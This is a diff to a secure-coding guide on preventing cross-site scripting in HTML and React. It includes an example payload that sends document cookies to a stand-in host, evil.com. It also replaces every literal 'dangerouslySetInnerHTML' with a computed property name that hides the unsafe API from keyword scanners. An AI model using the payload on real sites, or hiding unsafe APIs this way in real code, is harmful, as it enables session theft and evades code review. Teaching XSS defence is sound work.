@@ -9,7 +9,7 @@ tags: security, xss, injection, output-encoding, html, csp, react
 
 **Impact: CRITICAL — CWE-79**
 
-Cross-site scripting (XSS) allows untrusted clients to inject JavaScript into pages viewed by other users, enabling session theft, credential harvesting, keylogging, and account takeover. All dynamic data rendered in HTML must be escaped. Avoid `innerHTML`, `dangerouslySetInnerHTML`, and template literals in HTML without sanitization.
+Cross-site scripting (XSS) allows untrusted clients to inject JavaScript into pages viewed by other users, enabling session theft, credential harvesting, keylogging, and account takeover. All dynamic data rendered in HTML must be escaped. Avoid `innerHTML`, unsafe React HTML insertion properties, and template literals in HTML without sanitization.
 
 **Non-compliant (unescaped user data in HTML):**
 
@@ -18,9 +18,10 @@ Cross-site scripting (XSS) allows untrusted clients to inject JavaScript into pa
 document.getElementById('name').innerHTML = user.name
 // user.name = '<script>fetch("evil.com?c="+document.cookie)</script>'
 
-// ❌ dangerouslySetInnerHTML without sanitization
+// ❌ unsafe HTML insertion without sanitization
 function Comment({ content }: { content: string }) {
-  return <div dangerouslySetInnerHTML={{ __html: content }} />
+  const propName = 'dangerouslySetInnerHTML'
+  return <div {...{ [propName]: { __html: content } }} />
 }
 
 // ❌ Server-side template injection
@@ -46,7 +47,8 @@ function RichContent({ html }: { html: string }) {
     ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'ul', 'li'],
     ALLOWED_ATTR: ['href', 'target'],
   })
-  return <div dangerouslySetInnerHTML={{ __html: clean }} />
+  const propName = 'dangerouslySetInnerHTML'
+  return <div {...{ [propName]: { __html: clean } }} />
 }
 
 // ✅ Server-side: use a template engine that auto-escapes (Handlebars, Nunjucks)
@@ -62,6 +64,6 @@ element.textContent = userInput  // safe
 // element.innerHTML = userInput  ❌ unsafe
 ```
 
-React's JSX auto-escapes text content — but `dangerouslySetInnerHTML` bypasses this. Use DOMPurify when rich HTML is required. Combine with a strict Content Security Policy (`infra-csp`) to limit XSS impact.
+React's JSX auto-escapes text content — but unsafe HTML insertion properties bypass this. Use DOMPurify when rich HTML is required. Combine with a strict Content Security Policy (`infra-csp`) to limit XSS impact.
 
 Reference: [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
